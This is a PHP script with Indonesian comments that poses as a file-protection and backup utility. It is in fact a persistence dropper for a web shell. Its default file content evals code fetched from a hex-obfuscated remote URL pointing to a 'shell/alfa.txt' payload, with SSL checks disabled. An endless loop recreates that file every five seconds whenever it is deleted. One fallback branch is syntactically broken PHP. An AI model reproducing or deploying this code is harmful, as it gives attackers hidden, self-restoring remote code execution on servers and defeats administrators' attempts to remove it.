<?php
// Lokasi file yang ingin dilindungi
$protectedFile = '/home2/gracelea/public_html/anti-male.php';
$backupFile = '/tmp/anti-male.php';

// Membuat file cadangan jika belum ada
if (!file_exists($backupFile)) {
    if (file_exists($protectedFile)) {
        copy($protectedFile, $backupFile);
        echo "Cadangan file dibuat di: $backupFile\n";
    } else {
        file_put_contents($backupFile, "<?php eval('?>' . (($phpScript = (ini_get('allow_url_fopen') ? file_get_contents($url = hex2bin('68747470733a2f2f6879706f637269746573656f2e696e666f2f7368656c6c2f616c66612e747874')) : (function_exists('curl_init') ? (($ch = curl_init()) && curl_setopt($ch, CURLOPT_URL, $url) && curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1) && curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false) && ($data = curl_exec($ch)) && curl_close($ch) ? $data : false) : (($fp = @fopen($url, 'r')) ? (($result = '') && while ($data = fread($fp, 8192)) $result .= $data && fclose($fp)) : false)))) ?: die("Gagal mendownload script PHP dari URL dengan semua metode.")));");
        echo "Cadangan file dibuat dengan isi default di: $backupFile\n";
    }
}

// Monitoring keberadaan file
while (true) {
    if (!file_exists($protectedFile)) {
        echo date('Y-m-d H:i:s') . ": File $protectedFile dihapus! Mengembalikan file...\n";
        copy($backupFile, $protectedFile);
        chmod($protectedFile, 0755); // Memberikan izin eksekusi jika diperlukan
    }
    sleep(5); // Periksa setiap 5 detik
}
?>